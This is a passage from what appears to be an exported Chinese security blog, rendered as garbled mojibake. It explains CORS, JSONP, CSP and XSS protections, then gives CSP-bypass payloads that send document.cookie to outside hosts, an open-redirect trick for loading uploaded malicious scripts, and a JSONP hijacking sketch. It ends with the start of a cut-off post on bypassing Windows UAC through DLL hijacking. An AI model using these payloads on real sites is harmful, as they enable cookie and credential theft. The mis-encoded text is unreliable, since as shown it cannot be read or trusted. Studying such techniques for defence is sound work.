ä¼šå‘é“¶è¡Œç½‘ç«™å‘èµ·HTTPè¯·æ±‚ï¼Œæ¯”å¦‚å‘èµ·æŸ¥è¯¢è´¦æˆ·ä½™é¢çš„è¯·æ±‚ï¼ˆæ­¤æ—¶ä¼šé»˜è®¤é™„å¸¦ç”¨æˆ·çš„cookieï¼‰ã€‚é“¶è¡Œé¡µé¢å‘ç°cookieæ— è¯¯ï¼Œå°±ä¼šè¿”å›è¯·æ±‚çš„æ•°æ®:è´¦æˆ·ä½™é¢ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚ è·¨åŸŸä¸Šé¢æˆ‘ä»¬è¯´äº†åŒæºç­–ç•¥ä¸­ï¼Œä¸€ä¸ªé¡µé¢ä¸èƒ½å¯¹ä¸åŒæºçš„é¡µé¢è¿›è¡Œæ“ä½œã€‚ä½†æ˜¯åœ¨å®é™…æƒ…å†µä¸­ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›jsæ ‡ç­¾èƒ½æ‘†è„±è¿™ç§æŸç¼š,å¦‚scriptæ ‡ç­¾å°±èƒ½é€šè¿‡srcå±æ€§è·å–ä¸åŒæºé¡µé¢ä¸Šçš„jsä»£ç ï¼Œiframeèƒ½åµŒå…¥ä¸åŒæºç«™ç‚¹çš„èµ„æºç­‰ç­‰ã€‚è¿™æ ·çš„æ ‡ç­¾æœ‰å¦‚ä¸‹ &lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;&lt;object&gt; &lt;embed&gt; å’Œ &lt;applet&gt; çš„æ’ä»¶@font-face&lt;frame&gt; å’Œ &lt;iframe&gt; ä½†ä»…ä»…æ˜¯è¿™æ ·ï¼Œæœ‰äº›æ—¶å€™è¿˜æ˜¯æ— æ³•è¾¾åˆ°ä¸šåŠ¡çš„éœ€æ±‚ï¼Œæˆ‘ä»¬æœ‰æ—¶éœ€è¦çªç ´è¿™ç§é™åˆ¶æ¥è¾¾åˆ°ä¸šåŠ¡éœ€æ±‚ï¼Œä¹Ÿå°±æ˜¯é¿å¼€åŒæºç­–ç•¥ï¼Œä»¥ä¸‹æ˜¯å‡ ç§è§£å†³æ–¹æ¡ˆã€‚ CORSCORSï¼Œå³è·¨åŸŸèµ„æºå…±äº«ï¼Œå®ƒæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†ï¼Œå®šä¹‰äº†å¿…é¡»è®¿é—®è·¨åŸŸèµ„æºæ—¶ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨è¯¥å¦‚ä½•åå•†ã€‚å…¶å®è´¨å°±æ˜¯ä»¥AJAXä¸ºè½½ä½“ï¼Œä½¿ç”¨è‡ªå®šä¹‰HTTPå¤´è®©æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œåå•†ï¼Œä»è€Œå†³å®šè·¨åŸŸè¯·æ±‚æ˜¯å¦åº”è¯¥æˆåŠŸã€‚æ‰€ä»¥å®ç°CORSé€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨æ˜¯å¦å®ç°äº†CORSæ¥å£ã€‚ å¦å¤–ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒCORSï¼Œæ¯”å¦‚IE6,IE7,Opera min ä¸æ”¯æŒCORSã€‚ å®ç°åŸç†æµè§ˆå™¨æŠŠCORSçš„è¯·æ±‚åˆ†æˆä¸¤ç±»:ç®€å•è¯·æ±‚ä¸éç®€å•è¯·æ±‚ ç®€å•è¯·æ±‚:æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œå³ä¸ºç®€å•è¯·æ±‚ è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼šHEADGETPOSTä¸”HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼šAcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application&#x2F;x-www-form-urlencodedã€multipart&#x2F;form-dataã€text&#x2F;plain åªè¦ä¸æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œéƒ½ä¸ºéç®€å•è¯·æ±‚ã€‚ å¯¹äºç®€å•è¯·æ±‚ï¼Œå…¶å®ç°åŸç†å¦‚ä¸‹: 1.åœ¨è¯·æ±‚å¤´ä¸­åŠ ä¸€ä¸ªé¢å¤–å¤´:Origin, å…¶åŒ…å«å‘å‡ºè¯·æ±‚çš„é¡µé¢çš„åè®®ï¼ŒåŸŸåï¼Œç«¯å£ï¼ŒæœåŠ¡å™¨ä»¥æ­¤æ¥åˆ¤æ–­æ˜¯å¦ç»™äºˆå“åº”ã€‚2.æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåˆ¤åˆ«è¯¥OriginæŒ‡å‘çš„ç«™ç‚¹èƒ½å¦è·¨åŸŸã€‚è‹¥èƒ½è·¨åŸŸï¼Œå°±åœ¨ Access-Control-Allow-Origin å¤´éƒ¨ä¸­å›å‘ç›¸åŒçš„æºä¿¡æ¯ï¼ˆå¦‚æœæ˜¯å…¬å…±èµ„æºï¼Œå¯ä»¥å›å‘ * ï¼‰ï¼›è‹¥ä¸èƒ½è·¨åŸŸï¼Œåˆ™æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨æˆ–è€…æºä¿¡æ¯ä¸åŒ¹é…ï¼ˆå³Access-Control-Allow-Originå†…å®¹é*ä¸”ä¸Originä¸ç¬¦ï¼‰3.åŒæ—¶å¦‚æœæœåŠ¡å™¨è¿”å›çš„å¤´ä¸­æœ‰ Access-Control-Allow-Credentials: true ï¼Œåˆ™è¯´æ˜å¯ä»¥è·¨åŸŸå‘æœåŠ¡å™¨å‘é€å¸¦æœ‰cookieçš„HTTPè¯·æ±‚ã€‚ å¯¹äºéç®€å•è¯·æ±‚ï¼Œå®ƒä¼šå®ç°è¿›è¡Œé¢„æ£€ï¼Œå…¶åŸç†å¦‚ä¸‹:1.è¿›è¡Œé¢„æ£€ï¼Œä»¥OPTIONSæ–¹æ³•å‘æœåŠ¡å™¨å‘é€Originå¤´éƒ¨ï¼ŒAccess-Control-Request-Methodå¤´éƒ¨ï¼ˆæ¥ä¸‹æ¥çš„è¯·æ±‚æ–¹æ³•ï¼Œå¦‚POSTï¼‰ï¼ŒAccess-Control-Request-Headersï¼ˆè‡ªå®šä¹‰å¤´éƒ¨ä¿¡æ¯ï¼Œå¯é€‰ï¼‰2.æœåŠ¡å™¨å“åº”ï¼Œæœ‰å¦‚ä¸‹å¤´:Access-Control-Allow-Origin,Access-Control-Allow-Methods(å…è®¸çš„è¯·æ±‚æ–¹æ³•)ï¼ŒAccess-Control-Allow-Headersï¼ˆå…è®¸çš„è‡ªå®šä¹‰å¤´éƒ¨ä¿¡æ¯ï¼‰ï¼ŒAccess-Control-Max-Ageï¼ˆåº”è¯¥å°†é¢„æ£€è¯·æ±‚ç¼“å­˜å¤šé•¿æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ï¼‰3.é€šè¿‡é¢„æ£€è¯·æ±‚åï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨çš„CORSè¯·æ±‚éƒ½ä¼šå’Œç®€å•è¯·æ±‚ä¸€æ ·ã€‚ JSONPæˆ‘ä»¬ä¸å¦¨é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥çª¥è§†JSONPçš„å®ç°åŸç†ã€‚ æˆ‘ä»¬æœ‰å¦‚ä¸‹æ–‡ä»¶test.html &lt;html&gt; &lt;head&gt;&lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;HI&lt;&#x2F;h1&gt; &lt;script&gt; var fun1&#x3D;function(data)&#123; alert(data) &#125; &lt;&#x2F;script&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å…¶åŒ…å«çš„a.jså¦‚ä¸‹ fun1(&quot;remote data&quot;); è®¿é—®test.htmlï¼ŒæˆåŠŸè§¦å‘å¼¹çª—ï¼Œæˆ‘ä»¬å°†test.htmlä¸­çš„fun1å‡½æ•°ç§°ä¸ºå›è°ƒå‡½æ•° äºæ˜¯å°±å‡ºç°äº†åˆ©ç”¨è¿™ç§åŸç†æ¥å®ç°è·¨åŸŸä¼ è¾“æ•°æ®çš„æ–¹æ³•ï¼šJSONP ä¸‹é¢è¯´è¯´JSONPçš„å…·ä½“å®ç°æµç¨‹: å®¢æˆ·ç«¯:1.å®šä¹‰è·å–æ•°æ®åçš„å›è°ƒå‡½æ•°2.åŠ¨æ€ç”ŸæˆæœåŠ¡ç«¯JSè¿›è¡Œå¼•ç”¨çš„ä»£ç  å…³äºæ­¤å¤„ç¬¬2ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¯´é“è¯´é“ã€‚æˆ‘ä»¬å†ç”¨è¿™ä¸ªæ–¹æ³•å®ç°è·¨åŸŸæ—¶ï¼Œæ€ä¹ˆè®©è¿œç¨‹JSçŸ¥é“æˆ‘ä»¬æœ¬åœ°çš„å›è°ƒå‡½æ•°å«ä»€ä¹ˆåå­—ï¼Ÿè¿™å°±éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ®µåŠ¨æ€ç”ŸæˆæœåŠ¡ç«¯çš„JSä»£ç äº†ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡getå‚æ•°æ¥æ§åˆ¶å…¶è¿”å›çš„æœ¬åœ°å›è°ƒå‡½æ•°åï¼Œå¦‚: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1 æœåŠ¡ç«¯:è¿”å›ç”±å›è°ƒå‡½æ•°ååŒ…è£¹çš„JSONæ•°æ®ï¼Œå¦‚ fun1(&#123; &quot;key1&quot;:&quot;value1&quot;&#125;); è¿™é‡Œä¸ºä»€ä¹ˆè¦ç‰¹åˆ«å¼ºè°ƒæ˜¯JSONå‘¢ï¼Ÿå› ä¸ºJSONä¸ä»…å¯ä»¥ç®€æ´çš„è¡¨è¿°å¤æ‚çš„æ•°æ®ï¼Œè€Œä¸”JSåŸç”Ÿæ”¯æŒJSONï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯è‡ªç”±å¤„ç†JSONæ•°æ®ï¼Œæ‰€ä»¥æœåŠ¡ç«¯å¤šä¼ å›JSONæ•°æ®ï¼ŒJSONPè¿™ä¸ªåå­—ä¹Ÿæ˜¯è¿™ä¹ˆæ¥çš„ã€‚ CSPCSPï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚å®ƒé€šè¿‡ç™½åå•ç­–ç•¥ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCSPç›®å‰æœ‰1.0 2.0 3.0 ç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬çš„è§„åˆ™éƒ½æœ‰ä¸åŒ CSPè§„åˆ™CSPé€šè¿‡å®šä¹‰ä¸€ç³»åˆ—è§„åˆ™æ¥å®ç°å®‰å…¨ç®¡ç†ã€‚ é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹ä¸€æ¡CSPè§„åˆ™çš„èŒƒä¾‹ Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;å¤šä¸ªCSPæŒ‡ä»¤é—´ç”¨åˆ†å·éš”å¼€ï¼Œå¤šä¸ªæŒ‡ä»¤å€¼ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ ä¸‹é¢æ˜¯å„ä¸ªæŒ‡ä»¤åŠå…¶æŒ‡ä»¤å€¼çš„æ•ˆæœ æ‘˜è‡ªhttps://blog.csdn.net/qq_37943295/article/details/79978761 å¯ç”¨CSPé‚£ä¹ˆå¦‚ä½•å¯ç”¨CSPå‘¢ï¼Ÿæœ‰ä¸¤ç§æ–¹å¼ 1.åœ¨HTTPå¤´æ·»åŠ åœ¨HTTPå¤´å“åº”æ·»åŠ content-security-policyå¤´å¹¶å†™å…¥CSPè§„åˆ™ä»¥åï¼Œå°±èƒ½å¯ç”¨CSPäº† å›¾å¼•ç”¨äºhttp://www.ruanyifeng.com/blog/2016/09/csp.html 2.åœ¨metaæ ‡ç­¾é‡Œæ·»åŠ å‘å†…æ·»åŠ å¦‚ä¸‹å†…å®¹ &lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;å³å¯ ä¸€äº›å…¶ä»–XSSä¿æŠ¤æœºåˆ¶X-FrameX-Frame-Options æ˜¯ä¸€ä¸ªå“åº”å¤´ï¼ŒæŒ‡å®šæ­¤é¡µé¢èƒ½å¦åœ¨&lt;frame&gt;æˆ–è€…&lt;iframe&gt;ä¸­æ’å…¥.ä»–æœ‰ä¸‰ä¸ªå¯é€‰å€¼: DENY é¡µé¢ä¸èƒ½è¢«åµŒå…¥åˆ°ä»»ä½•iframeæˆ–frameä¸­ SAMEORIGIN é¡µé¢åªèƒ½è¢«æœ¬ç«™é¡µé¢åµŒå…¥åˆ°iframeæˆ–è€…frameä¸­ ALLOW-FROM uri è¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ frame ä¸­å±•ç¤ºã€‚ XSS auditorhttponlyhttponly æ˜¯ä¸€ä¸ªé’ˆå¯¹cookieçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶å®ç°åŸç†æ˜¯åœ¨responseä¸­å¯¹æŸä¸€é¡¹cookieè®¾ç½®ä¸ºHTTPONLY=trueï¼Œä»è€Œä½¿è¯¥cookieä¸èƒ½è¢«document.cookie è¯»å–ã€‚ æˆ‘ä»¬éšä¾¿æ‰¾ä¸ªç½‘ç«™ï¼Œå‘ç°å…¶captch_session_v2å¼€å¯äº†httponly éšåæˆ‘ä»¬é€šè¿‡document.cookieå°è¯•å»è¯»å–aptch_session_v2çš„å€¼ï¼Œå‘ç°å…¶å€¼å¹¶æ²¡æœ‰å‡ºç°åœ¨è¿”å›å†…å®¹ä¸­ htmlspecialcharshtmlspecialcharsæ˜¯ä¸€ä¸ªphpå‡½æ•°ï¼Œå®ƒå¯ä»¥å°†ä¸€äº›æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ &amp; (AND) &#x3D;&gt; &amp;&quot; (åŒå¼•å·) &#x3D;&gt; &quot; (å½“ENT_NOQUOTESæ²¡æœ‰è®¾ç½®çš„æ—¶å€™) &#39; (å•å¼•å·) &#x3D;&gt; &amp;#039; (å½“ENT_QUOTESè®¾ç½®) &lt; (å°äºå·) &#x3D;&gt; &lt; &gt; (å¤§äºå·) &#x3D;&gt; &gt; æ”»å‡»æ‰‹æ®µbypass cspcspï¼Œæ˜¯å¯ä»¥è¢«bypassçš„ã€‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±æƒ³åŠæ³•bypass cspæ¥å›ä¼ cookie 1 default-src &#39;none&#39;; å¯ä»¥é€šè¿‡metaæ ‡ç­¾å®ç°é‡å®šå‘ &lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt; å³ï¼Œ1ç§’åè·³è½¬è‡³æŒ‡å®šurl 2 script-src â€˜selfâ€™ â€˜unsafe-inlineâ€™ å¼€æ”¾äº†å†…è”è„šæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡window.location,windows.openæˆ–è€…metaæ ‡ç­¾å®ç°é¡µé¢è·³è½¬ã€‚ä¹Ÿå¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»ºå…ƒç´ å®ç°è·³è½¬ var a &#x3D; document.createElement(&quot;a&quot;);a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;a.click(); 3 default-src &#39;self&#39;; script-src &#39;self&#39; é™åˆ¶äº†åªèƒ½åŠ è½½æœ¬åŸŸJSè„šæœ¬ï¼ŒåŒæ—¶ç¦æ­¢äº†å†…è”è„šæœ¬æ‰§è¡Œã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„JSæ–‡ä»¶ï¼Œä¸Šä¼ åå¦‚æœæˆ‘ä»¬çŸ¥é“æ­¤JSæ–‡ä»¶ä¸Šä¼ ä½ç½®ä¸æ–‡ä»¶åä¸”ä¸Šä¼ çš„ä½ç½®æ˜¯æœ¬åŸŸï¼Œç„¶åé€šè¿‡XSSå®ç°åŠ è½½æ­¤æ¶æ„JSæ–‡ä»¶ã€‚ å¦å¤–åœ¨CSP1.0ç‰ˆæœ¬ä¸­ï¼Œè¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œè·³è½¬(ç°åœ¨ä¸å’‹å¥½ç”¨äº†) &lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5é¢„åŠ è½½)&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; ï¼ˆDNSé¢„åŠ è½½ï¼‰ 4 script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; é™åˆ¶äº†åªèƒ½ä»æŸç‰¹å®šè·¯å¾„å»åŠ è½½JSè„šæœ¬å¯¹æ­¤ä¸€èˆ¬çš„è§£å†³æ–¹æ³•æ˜¯çœ‹çœ‹æ­¤ç›®å½•ä¸‹æœ‰æ²¡æœ‰å¯æ§é‡å®šå‘çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¿™ç§ b&#x2F;302.php&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt; æˆ‘ä»¬å°±å¯ä»¥æ’å…¥ &lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt; &lt;&#x2F;script&gt; å»åŠ è½½æˆ‘ä»¬ä¸Šä¼ çš„JSè„šæœ¬ï¼ˆä¸Šä¼ ç‚¹è‡ªå·±æ‰¾ï¼‰ JSONP åŠ«æŒç®€å•è¯´ä¸€è¯´ é¦–å…ˆå­˜åœ¨ç½‘ç«™Bï¼Œå®ƒåŒ…å«ç™»å½•ç”¨æˆ·çš„ID,passwdç­‰æ•æ„Ÿä¿¡æ¯ã€‚ä¸”æœ‰é¡µé¢http://B.com/user?callback= ç”¨æ¥è¿›è¡ŒJSONPè·¨åŸŸæ•°æ®ä¼ è¾“ID,PASSWDç­‰ä¿¡æ¯ï¼Œè¿™æ˜¯å‰æã€‚ç”¨æˆ·ç™»å½•Båï¼Œæ‰“å¼€äº†æˆ‘ä»¬çš„æ¶æ„ç½‘ç«™A.com,A.comçš„å†…å®¹ä¸º: &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;function Callback(result)&#123; å°†è·å–å†…å®¹ä¸Šä¼ è‡³æ¶æ„æœåŠ¡å™¨çš„JSä»£ç .....&#125; é‚£ä¹ˆAç½‘ç«™å°±ä¼šå‘ç½‘ç«™Bè·¨åŸŸè¯·æ±‚åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œå¹¶ä¸Šä¼ åˆ°æ¶æ„æœåŠ¡å™¨ä¿å­˜ã€‚è¿™å°±æ˜¯JSONPåŠ«æŒï¼Œæ­¤æ–¹æ³•å¸¸ç”¨äºæ°´å‘æ”»å‡» å¸¸ç”¨è§¦å‘ç‚¹ä¸bypasshttps://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html","categories":[],"tags":[{"name":"å¤–å›´æ‰“ç‚¹","slug":"å¤–å›´æ‰“ç‚¹","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"BypassUACæŠ€æœ¯æ€»ç»“","slug":"Bypass UAC","date":"2021-06-28T13:52:05.780Z","updated":"2021-06-28T13:40:35.984Z","comments":true,"path":"2021/06/28/Bypass UAC/","link":"","permalink":"http://const27.com/2021/06/28/Bypass%20UAC/","excerpt":"","text":"UACç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUser Account Controlï¼Œç®€å†™ä½œUAC)æ˜¯å¾®è½¯å…¬å¸åœ¨å…¶[Windows Vista](https://baike.baidu.com/item/Windows Vista)åŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶ï¼Œä¿æŠ¤ç³»ç»Ÿè¿›è¡Œä¸å¿…è¦çš„æ›´æ”¹ï¼Œæå‡æ“ä½œç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚ç®¡ç†å‘˜åœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä»¥ä½æƒé™è¿è¡Œä»»åŠ¡çš„ï¼Œè¿™ä¸ªçŠ¶æ€è¢«ç§°ä¸ºè¢«ä¿æŠ¤çš„ç®¡ç†å‘˜ã€‚ä½†å½“ç®¡ç†å‘˜è¦æ‰§è¡Œé«˜é£é™©æ“ä½œï¼ˆå¦‚å®‰è£…ç¨‹åºç­‰ï¼‰ï¼Œå°±éœ€è¦æå‡æƒé™å»å®Œæˆè¿™äº›ä»»åŠ¡ã€‚è¿™ä¸ªæå‡æƒé™çš„è¿‡ç¨‹é€šå¸¸æ˜¯è¿™æ ·çš„ï¼Œç›¸ä¿¡å„ä½éƒ½çœ¼ç†Ÿè¿‡ã€‚ ç‚¹å‡»â€œæ˜¯â€ï¼Œç®¡ç†å‘˜å°±ä¼šæå‡åˆ°é«˜æƒé™å†å»è¿è¡Œè¯¥ä»»åŠ¡ã€‚ autoElevateä¸requestedExecutionLevelautoElevateå½“æŸä¸ªEXEæ–‡ä»¶çš„æ–‡ä»¶æ¸…å•é‡Œæœ‰&lt;autoElevate&gt; å…ƒç´ æ—¶ï¼Œå½“æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ä¼šé»˜è®¤ææƒæ‰§è¡Œã€‚æˆ‘ä»¬åŠ«æŒè¯¥exeæ–‡ä»¶çš„dllï¼Œå¯ä»¥è¾¾åˆ°Bypass UACææƒçš„ç›®çš„ã€‚é€‚ç”¨èŒƒå›´:ç®¡ç†å‘˜æƒé™ä»¥è·å¾—ï¼Œè¦å¾—åˆ°é«˜æƒé™ç®¡ç†å‘˜æƒé™ ä¸€èˆ¬ç”¨å·¥å…·sigcheckæ£€æµ‹ ç½‘ä¸Šå¸¸æ‹¿C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe ä¸¾åˆ—å­ è¿™ä¸ªä¸œè¥¿å¾ˆæœ‰ç”¨ï¼Œæ˜¯ä¸‹é¢éƒ¨åˆ†æ–¹æ³•çš„å‰ææ¡ä»¶ requestedExecutionLevel æœ‰ä¸‰ä¸ªä¸åŒçš„å‚æ•°ï¼šasInvoker requireAdministrator highestAvailable åˆ†åˆ«å¯¹åº”åº”ç”¨ç¨‹åºä»¥ä»€ä¹ˆæƒé™è¿è¡Œ asInvokerï¼šçˆ¶è¿›ç¨‹æ˜¯ä»€ä¹ˆæƒé™ï¼Œæ­¤åº”ç”¨ç¨‹åºå°±æ˜¯ä»€ä¹ˆæƒé™ requireAdministratorï¼šéœ€è¦ä»¥ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œï¼Œæ­¤ç±»åº”ç”¨ç¨‹åºå›¾æ ‡å³ä¸‹æ–¹ä¼šæœ‰ä¸ªç›¾ç‰Œæ ‡è®° highestAvailableï¼šæ­¤ç¨‹åºä»¥å½“å‰ç”¨æˆ·èƒ½è·å–åˆ°çš„æœ€é«˜æƒé™è¿è¡Œã€‚å½“ä½ åœ¨ç®¡ç†å‘˜è´¦æˆ·ä¸‹è¿è¡Œæ­¤ç¨‹åºå°±ä¼šè¦æ±‚æƒé™æå‡ä»¥åŠå¼¹å‡ºUACæ¡†ã€‚å½“ä½ åœ¨æ ‡å‡†è´¦æˆ·ä¸‹è¿è¡Œæ­¤ç¨‹åºï¼Œç”±äºæ­¤è´¦æˆ·çš„æœ€é«˜æƒé™å°±æ˜¯æ ‡å‡†è´¦æˆ·ï¼Œæ‰€ä»¥åŒå‡»ä¾¿è¿è¡Œ ç™½åå•ç¨‹åºé™¤äº†åˆšåˆšè¯´çš„autoelevateï¼Œè¿˜æœ‰ä¸€ç±»å«ç™½åå•ç¨‹åºçš„åº”ç”¨ç¨‹åºä¹Ÿæ˜¯æ‰“å¼€é»˜è®¤ææƒçš„ã€‚å¦‚æœåŠ¡ç®¡ç†å·¥å…·ä¸‹çš„è®¸å¤šåº”ç”¨éƒ½å±äºç™½åå•ç¨‹åºï¼Œè€Œå…¶ä¸­åˆæœ‰äº›ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦ä¾èµ–CLRæ”¯æŒï¼ˆå¦‚äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºï¼‰ Bypass UACDLLåŠ«æŒreference:https://www.anquanke.com/post/id/209033https://www.cnblogs.com/0daybug/p/11719541.html exeæ–‡ä»¶è¿è¡Œæ—¶ä¼šåŠ è½½è®¸å¤šdllæ–‡ä»¶ï¼Œè¿™äº›dllæ–‡ä»¶çš„åŠ è½½é¡ºåºæ˜¯ ç¨‹åºæ‰€åœ¨ç›®å½• ç³»ç»Ÿç›®å½•å³SYSTEM32ç›®å½• 16ä½ç³»ç»Ÿç›®å½•å³SYSTEMç›®å½• Windowsç›®å½• ç¨‹åºåŠ è½½ç›®å½•(SetCurrentDirecctory) PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½• åŒæ—¶ï¼ŒdllåŠ è½½ä¹Ÿéµå¾ªç€Know DLLsæ³¨å†Œè¡¨é¡¹çš„æœºåˆ¶ï¼šKnow DLLsæ³¨å†Œè¡¨é¡¹æŒ‡å®šçš„DLLæ˜¯å·²ç»è¢«æ“ä½œç³»ç»ŸåŠ è½½è¿‡åçš„DLLï¼Œä¸ä¼šè¢«åº”ç”¨ç¨‹åºæœç´¢å¹¶åŠ è½½ã€‚åœ¨æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLSå¤„å¯ä»¥çœ‹è§è¿™äº›dll åœ¨knowdllsè¡¨é¡¹ä¸­çš„dllæ˜¯é¢„å…ˆå°±åŠ è½½è¿›å†…å­˜ç©ºé—´çš„ï¼Œè¢«è¯¸å¤šåº”ç”¨è°ƒç”¨ç€ï¼Œæ”¹åŠ¨éœ€è¦é«˜æƒé™ã€‚ å¦‚æœæˆ‘ä»¬åœ¨åº”ç”¨ç¨‹åºæ‰¾åˆ°æ­£ç¡®çš„dllä¹‹å‰ï¼Œå°†æˆ‘ä»¬è‡ªå·±åˆ›é€ çš„dllæ”¾å…¥ä¼˜å…ˆçº§æ›´é«˜çš„æœç´¢ç›®å½•è®©åº”ç”¨ç¨‹åºä¼˜å…ˆåŠ è½½æ­¤dllæ–‡ä»¶ï¼Œè¿™å°±é€ æˆäº†dllåŠ«æŒã€‚ä½†è¿™åªæ˜¯dllåŠ«æŒçš„å…¶ä¸­ä¸€ç§é€”å¾„ï¼Œä»–æœ‰è¿™äº›é€”å¾„ï¼š ï¼ˆ1ï¼‰ DLLæ›¿æ¢ï¼šç”¨æ¶æ„çš„DLLæ›¿æ¢æ‰åˆæ³•çš„DLLï¼ˆ2ï¼‰ DLLæœç´¢é¡ºåºåŠ«æŒï¼šå½“åº”ç”¨ç¨‹åºåŠ è½½DLLçš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰å¸¦æŒ‡å®šDLLçš„è·¯å¾„ï¼Œé‚£ä¹ˆç¨‹åºå°†ä¼šä»¥ç‰¹å®šçš„é¡ºåºä¾æ¬¡åœ¨æŒ‡å®šçš„è·¯å¾„ä¸‹æœç´¢å¾…åŠ è½½çš„DLLã€‚é€šè¿‡å°†æ¶æ„DLLæ”¾åœ¨çœŸå®DLLä¹‹å‰çš„æœç´¢ä½ç½®ï¼Œå°±å¯ä»¥åŠ«æŒæœç´¢é¡ºåºï¼ŒåŠ«æŒçš„ç›®å½•æœ‰æ—¶å€™åŒ…æ‹¬ç›®æ ‡åº”ç”¨ç¨‹åºçš„å·¥ä½œç›®å½•ã€‚ï¼ˆ3ï¼‰ è™šæ‹ŸDLLåŠ«æŒï¼šé‡Šæ”¾ä¸€ä¸ªæ¶æ„çš„DLLæ¥ä»£æ›¿åˆæ³•åº”ç”¨ç¨‹åºåŠ 